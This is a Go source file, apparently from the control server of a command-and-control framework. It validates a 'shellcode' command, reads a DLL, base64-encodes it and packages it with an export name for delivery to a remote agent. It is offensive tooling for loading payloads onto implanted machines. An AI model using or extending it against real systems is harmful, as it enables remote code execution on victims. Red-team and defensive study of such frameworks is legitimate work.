package control

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
)

// validateShellcodeCommand validates "shellcode" command arguments from client
func validateShellcodeCommand(rawArgs json.RawMessage) error {
	if len(rawArgs) == 0 {
		return fmt.Errorf("shellcode command requires arguments")
	}

	var args ShellcodeArgsClient

	if err := json.Unmarshal(rawArgs, &args); err != nil {
		return fmt.Errorf("invalid argument format: %w", err)
	}

	if args.FilePath == "" {
		return fmt.Errorf("file_path is required")
	}

	if args.ExportName == "" {
		return fmt.Errorf("export_name is required")
	}

	// Check if file exists
	if _, err := os.Stat(args.FilePath); os.IsNotExist(err) {
		return fmt.Errorf("file does not exist: %s", args.FilePath)
	}

	log.Printf("Validation passed: file_path=%s, export_name=%s", args.FilePath, args.ExportName)

	return nil
}

// processShellcodeCommand reads the DLL file and converts to base64
func processShellcodeCommand(rawArgs json.RawMessage) (json.RawMessage, error) {

	var clientArgs ShellcodeArgsClient

	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
		return nil, fmt.Errorf("unmarshaling args: %w", err)
	}

	// Read the DLL file
	file, err := os.Open(clientArgs.FilePath)
	if err != nil {
		return nil, fmt.Errorf("opening file: %w", err)
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		return nil, fmt.Errorf("reading file: %w", err)
	}

	// Convert to base64
	shellcodeB64 := base64.StdEncoding.EncodeToString(fileBytes)

	// Create the arguments that will be sent to the agent
	agentArgs := ShellcodeArgsAgent{
		ShellcodeBase64: shellcodeB64,
		ExportName:      clientArgs.ExportName,
	}

	// Marshal arguments ready to be sent to agent
	processedJSON, err := json.Marshal(agentArgs)
	if err != nil {
		return nil, fmt.Errorf("marshaling processed args: %w", err)
	}

	log.Printf("Processed file: %s (%d bytes) -> base64 (%d chars)",
		clientArgs.FilePath, len(fileBytes), len(shellcodeB64))

	return processedJSON, nil
}
